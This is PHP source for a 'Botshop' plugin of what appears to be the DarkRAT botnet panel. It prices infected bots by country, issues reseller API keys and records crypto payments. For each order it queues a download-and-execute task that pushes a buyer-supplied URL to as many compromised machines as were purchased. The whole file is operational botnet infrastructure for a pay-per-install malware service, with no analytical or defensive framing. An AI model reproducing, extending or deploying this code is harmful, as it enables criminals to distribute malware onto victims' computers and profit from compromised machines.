<?php

class Botshop{
    public function __construct()
    {
        $GLOBALS["template"][0] = get_plugin_base_dir("botshop") . "/template/Botshop";
    }


    private function shorter($text, $chars_limit)
    {
        // Check if length is larger than the character limit
        if (strlen($text) > $chars_limit)
        {
            // If so, cut the string at the character limit
            $new_text = substr($text, 0, $chars_limit);
            // Trim off white space
            $new_text = trim($new_text);
            // Add at end of text ...
            return $new_text . "...";
        }
        // If not just return the text as is
        else
        {
            return $text;
        }
    }

    private function random_string() {
        if(function_exists('random_bytes')) {
            $bytes = random_bytes(16);
            $str = bin2hex($bytes);
        } else if(function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes(16);
            $str = bin2hex($bytes);
        } else if(function_exists('mcrypt_create_iv')) {
            $bytes = mcrypt_create_iv(16, MCRYPT_DEV_URANDOM);
            $str = bin2hex($bytes);
        } else {
            //Bitte euer_geheim_string durch einen zufälligen String mit >12 Zeichen austauschen
            $str = md5(uniqid('euer_geheimer_string', true));
        }
        return $str;
    }

    public function options(){
        if(empty($_SESSION["darkrat_userid"])) {
            die("Login Required");
        }


        $GLOBALS["template"][1] = "options";


        if(!empty($_POST["create_new_shop_api"])){
            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_access (created_by_userid, apikey, botprice) VALUES (:userid, :apikey, :botprice)");
            $statement->execute(array('userid' => $_SESSION["darkrat_userid"],'botprice' => "0.20", 'apikey' => $this->random_string()));
        }

        if(!empty($_POST["deleteapi"])){
            $statement =  $GLOBALS["pdo"]->prepare("DELETE FROM botshop_access WHERE id = ?");
            $statement->execute(array($_POST["deleteapi"]));
        }

        if(!empty($_POST["use_api"])){
            if(empty($_POST["amount"])){
               die("Empty Load Amount");
            }
            if(empty($_POST["loadurl"])){
               die("Empty Load URL");
            }

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access WHERE id = ?");
            $statement->execute(array($_POST["use_api"]));
            $apidetails = $statement->fetch();
            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO botshop_orders (type, address, privatekey, usd, coinstopay, botamount, loadurl, userauthkey,from_access_api) VALUES (?, ?, ?, ?, ?, ?, ?, ?,?)");
            $statement->execute(array("custom", "", "", "", "", $_POST["amount"],$_POST["loadurl"],$_POST["frontend_user"],$apidetails["apikey"]));
            $orderId = $GLOBALS["pdo"]->lastInsertId();

            $statement = $GLOBALS["pdo"]->prepare("INSERT INTO tasks (filter, status, task, command, execution_limit) VALUES (?, ?, ?, ?, ?)");
            $statement->execute(array('{"onlybot":""}', 0, 'dande', $_POST["loadurl"], $_POST["amount"]));
            $taskid = $GLOBALS["pdo"]->lastInsertId();

            $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_orders SET payed = ?, taskid = ? WHERE id = ?");
            $statement->execute(array(1, $taskid, $orderId));

        }


        $statementConfig = $GLOBALS["pdo"]->prepare("SELECT SUM(CASE When botshop_orders.payed=1 AND botshop_orders.type = 'btc'  Then botshop_orders.coinstopay Else 0 End ) as profit_btc,
SUM(CASE When botshop_orders.payed=1 AND botshop_orders.type = 'eth'  Then botshop_orders.coinstopay Else 0 End ) as profit_eth,
 botshop_access.apikey, botshop_access.id, users.username 
                                                         FROM botshop_access 
                                                         LEFT JOIN users ON users.id = botshop_access.created_by_userid 
                                                         LEFT JOIN botshop_orders ON botshop_orders.from_access_api = botshop_access.apikey
                                                          WHERE botshop_access.active = ? group by botshop_access.apikey");
        $statementConfig->execute(array(1));
        $botshopAccessList = $statementConfig->fetchAll();



        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access ");
        $statement->execute(array());
        $access_apis = array();
        while($row = $statement->fetch()) {
            $access_apis[] = $row;
        }




        $GLOBALS["tpl"]->assign("botshopAccessList", $botshopAccessList);
        $GLOBALS["tpl"]->assign("access_apis", $access_apis);
        $GLOBALS["tpl"]->assign("frontend_user", md5($this->random_string()));

    }

    public function editapi($id){
        if(empty($_SESSION["darkrat_userid"])) {
            die("Login Required");
        }

        if(!empty($_POST["changesandbox"])){

            $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access WHERE id = ?");
            $statement->execute(array($id));
            $apidetails = $statement->fetch();
            if($apidetails["sandbox"] == 0){
                $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_access SET sandbox = ? WHERE id = ?");
                $statement->execute(array(1, $id));
            }else{
                $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_access SET sandbox = ? WHERE id = ?");
                $statement->execute(array(0, $id));
            }

        }

        $GLOBALS["template"][1] = "editapi";
        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_access WHERE id = ?");
        $statement->execute(array($id));
        $apidetails = $statement->fetch();


        $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_orders WHERE from_access_api = ?");
        $statement->execute(array($apidetails["apikey"]));
        $orders = array();
        while($row = $statement->fetch()) {
            $row["privatekey_short"] = $this->shorter($row["privatekey"],15);
            $row["address_short"] = $this->shorter($row["address"],15);
            $orders[] = $row;
        }

        $GLOBALS["tpl"]->assign("apidetails", $apidetails);
        $GLOBALS["tpl"]->assign("orders", $orders);
    }

    public function botshopprice(){
        if(empty($_SESSION["darkrat_userid"])) {
            die("Login Required");
        }
            if(!empty($_POST["sync_countries"])){
                $sql = "SELECT country, count(*) as NUM FROM bots GROUP BY country";
                foreach ($GLOBALS["pdo"]->query($sql) as $row) {

                    $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_pricelist WHERE iso_short = :iso_short");
                    $result = $statement->execute(array('iso_short' => $row["country"]));
                    $country = $statement->fetch();
                    if($country == false) {
                        $statement =  $GLOBALS["pdo"]->prepare("INSERT INTO botshop_pricelist (iso_short, price_usd) VALUES (:iso_short, :price_usd)");
                        $result = $statement->execute(array('iso_short' => $row["country"], 'price_usd' => "0.20"));
                    }
                }
            }


            if(!empty($_POST["saveprice"])){
                foreach( $_POST['country'] as $key => $value ) {
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_pricelist SET price_usd = ? WHERE iso_short = ?");
                    $statement->execute(array($value, $key));
                }
            }

            if(!empty($_POST["default_bot_price"])){

                $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM botshop_pricelist WHERE iso_short = :iso_short");
                $result = $statement->execute(array('iso_short' => "mix"));
                $country = $statement->fetch();
                if($country == false) {
                    $statement =  $GLOBALS["pdo"]->prepare("INSERT INTO botshop_pricelist (iso_short, price_usd) VALUES (:iso_short, :price_usd)");
                    $result = $statement->execute(array('iso_short' =>  "mix", 'price_usd' => $_POST["default_bot_price"]));
                }else{
                    $statement = $GLOBALS["pdo"]->prepare("UPDATE botshop_pricelist SET price_usd = ? WHERE iso_short = ?");
                    $statement->execute(array($_POST["default_bot_price"], "mix"));
                }

            }



        $prices = [];
        $sql = "SELECT * FROM botshop_pricelist";
        foreach ($GLOBALS["pdo"]->query($sql) as $listItem) {
            $prices[] = $listItem;
        }
        $GLOBALS["tpl"]->assign("prices", $prices);
    }
}